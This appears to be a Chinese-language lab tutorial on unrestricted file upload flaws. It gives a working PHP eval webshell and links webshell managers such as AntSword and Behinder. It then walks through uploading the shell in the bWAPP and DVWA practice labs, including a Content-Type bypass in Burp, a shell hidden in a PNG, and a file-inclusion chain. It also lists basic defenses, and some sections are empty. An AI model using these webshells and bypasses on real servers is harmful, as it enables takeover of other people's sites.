# 文件上传漏洞



https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload



# 1.基本概念

```python
文件上传(File Upload)是大部分Web应用都具备的功能，
例如用户上传附件、改头像、分享图片等。

文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，
这里上传的文件可以是木马、病毒、恶意脚本或者Webshell等。

可以简单理解:能随意上传任何文件的网站就存在漏洞。

也即是说，凡是文件上传功能，就应该做校验。
```

## 1.1 webshell

```python
WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，
也可以将其称做为─种网页后门。
黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文
件混在一起，以达到控制网站服务器的目的。
```

### 1.1.1 分类

```python
1.大马
体积大，功能全
会调用系统的关键函数
以代码加密进行隐藏

2.小马
体积小，功能少
只上传一个功能

3.一句话木马
代码短，只有一行代码 
使用场景大，可单独生成文件，可插入文件 
安全性高，隐匿性强，可变形免杀 
框架不变，数据执行(数据传递)
```

### 1.1.2 一句话木马

```php
我们可以通过GET 、POST 、COOKIE这三种方式向一个网站提交数据，
一句话木马用$_GET[' ']、$_POST[' ']、$_COOKIE[' '] 接收我们传递的数据，
并把接收的数据传递给一句话木马中执行命令的函数，进而执行命令。
所以看到的经典一句话木马大多都是只有两个部分，
一个是可以执行代码的函数部分，一个是接收数据的部分。

<?php eval($_GET['hello']);?>

首先我们先看一个原始而又简单的php一句话木马:
(1) php的代码要写在里面，服务器才能认出来这是php代码，然后才去解析。
(2) []符号的意思是不报错，即使执行错误，也不报错
(3) eval将字符串当做PHP代码执行
```

## 1.99 防御措施

```python
防御文件上传的方法各种各样
1.限制文件上传类型(不让上传php文件、只允许上传图片)
2.给上传的文件重命名，让攻击者找不到自己传的文件在哪里
3.限制文件上传大小(能防范大马及文件攻击，对小马或者一句话木马没用)
4.服务器重新生成图片，压缩上传文件，计算前后的MD5值
5.把上传的文件存储在文件服务器或oss平台（没存在原本的服务器上，传了也没用)
```

# 2.中国菜刀

```python
https://github.com/raddyfiy/caidao-official-version
```

```python
中国菜刀，一个非常好用而又强大的webshell，它可不是用来切菜的做饭的道具哦，
是一款专业的网站管理软件，大小只有300多KB，真是小巧实用啊!
不过被不法分子利用到，就是一个黑站的利器了
1.中国菜刀支持的服务端脚本:PHP、ASP;
2.主要功能有:文件管理（有足够的权限时候可以管理整个磁盘/文件系统)，数据库管理，虚拟终端。
3.菜刀的工作原理是:利用上传到服务器的一句话脚本再通过一些添加配置就可以工作了。
```

# 3.中国蚁剑

```python
https://github.com/AntSwordProject/AntSword-Loader (安装包下载地址)
https://github.com/AntSwordProject/antSword (源码下载地址)
https://doc.u0u.us/zh-hans/getting_started/get_antsword.html (文档)

源码和加载器都要下载。

1.解压 AntSword-Loader，解压 antSword 源码

2.双击 AntSword-Loader 目录下的 exe 文件

3.首次进入，需要初始化源码目录，这里选择 antSword 源码目录即可

一剑在手，纵横无忧!
中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人
员以及进行常规操作的网站管理员。
任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担并将追究其相关责任!

https://blog.csdn.net/weixin_41924764/article/details/108099952
```

# 4.冰蝎

```python
https://githu.com/rebeyond/Behinder (文档库)
https://github.com/rebeyond/Behinder/releases (下载地址)
```

# 5.哥斯拉-Godzilla

```python

```

[护网中用到的23个常见Webshell网站管理工具---白帽子渗透工具 - 菜菜聊架构 - 博客园](https://www.cnblogs.com/caicz/p/16531215.html) (工具汇总)

[常用Webshell工具_IDebugger_kxk的博客-CSDN博客_antsword](https://blog.csdn.net/qq_43757105/article/details/120980134)

# 2.bwapp靶场

## 2.1 找到文件上传的接口

```php
http://10.102.224.206:9091/unrestricted_file_upload.php
```

## 2.2 新建 php 文件 file_upload.php，编辑内容

```php
<?php @eval($_POST['hello']); ?>
```

## 2.3 访问刚才注入的文件

```http

```

# 3.dvwa 靶场

## 3.1 测试1

### 3.1.1 将 DVWA Security 的 Security Level 置为 low

```php
观察源码可知，没有做任何校验。
```

### 3.1.2 新建一个file_upload.php文件，并编辑内容为

```php
<?php @eval($_POST['hello']); ?>
```

### 3.1.3 上传文件

```php
http://10.102.224.206:9093/vulnerabilities/upload/
```

### 3.1.4 访问上传的木马

```php
1.访问
http://10.102.224.206:9093/hackable/uploads/file_upload.php

2.f12 打开firefox的控制台，找到HackbarV2的界面

3.load URL

4.勾选post data

5.在输入框中输入内容(hello是因为上传的一句话木马中，预留参数是hello),其余的是要执行的命令。
hello=phpinfo();
hello=system('whoami');
hello=system('pwd');
```

### 3.1.5 使用中国蚁剑访问

```python
1.添加数据，URL地址填写木马文件地址
http://10.102.224.206:9093/hackable/uploads/file_upload.php

2.连接密码：
就是木马文件中的预留变量字符串，此处是 hello

3.测试连接：
看到连接成功界面即可。

4.点击添加即可。

5.双击添加的记录行，即可看到我们已经接管了目标主机的磁盘。
或者，在记录上--》右键--》新建虚拟终端，即可看到命令行。
```

## 3.2 测试2 (用chrome浏览器打开)

### 3.2.1 将 DVWA Security 的 Security Level 置为 medium

```php
此时如果上传upload_file.php 将会有如下提示：
Your image was not uploaded. We can only accept JPEG or PNG images.

观察源码可知，后台校验了文件类型必须是：image/jpeg或者image/png
```

### 3.2.2 上传

```php
直接上传，发现会上传失败。我们先用burp抓包并修改下。
```

### 3.2.3 burp 操作

```php
1.由于是使用的chrome，请确保chrome的代理设置为了127.0.0.1:8080
(即同burp-->proxy-->options里的ip:port设置一样即可)

2.再次上传.php文件

3.到burp--->proxy-->http history 中找到对应的上传请求-->右键-->发送给重发器

4.到burp-->repeater-->修改content-type：image/png-->点击发送
(需要注意：可能会有多个content-type，请先分析要修改对应的content-type)

5.再次观察，应该上传成功了。此时再用‘中国蚁剑’便又能进入了。
```

## 3.3 测试3 (用chrome浏览器打开)

### 3.3.1 将 DVWA Security 的 Security Level 置为 High

```php
观察源码可知，后台
校验了文件后缀名必须是：jpg，jpeg, png。
校验了文件大小 < 100000。
校验了图片文件大小 < 100000 (如果不是图片，将会报错)。
```

### 3.3.2 上传木马图片

```php
1.随意制作一张空白图片(比如qq截个空白图)

2.在win10上执行命令 copy /b 1.png + file_upload1.php 1.png
(注意：1.png 要和 file_upload1.php 在同级目录下)

3.用记事本打开 1.png，发现在图片的最后面便是自己的木马。

4.用中国蚁剑发现连接不上，如果能连接上，请清楚缓存。
http://10.102.224.206:9093/hackable/uploads/1.png
```

### 3.3.3 利用文件包含漏洞来进行组合攻击

```php
0.在浏览器输入后发现乱码，说明文件包含漏洞执行成功
http://10.102.224.206:9093/vulnerabilities/fi/?page=file:////var/www/html/hackable/uploads/1.png


1.在中国蚁剑中输入
http://10.102.224.206:9093/vulnerabilities/fi/?page=file:////var/www/html/hackable/uploads/1.png

2.密码是 hello

3.设置请求信息：
将Headers 中添加 cookie, value为对应的登录之后的值即可。

4.点击测试连接，发现便可以连接成功。
```


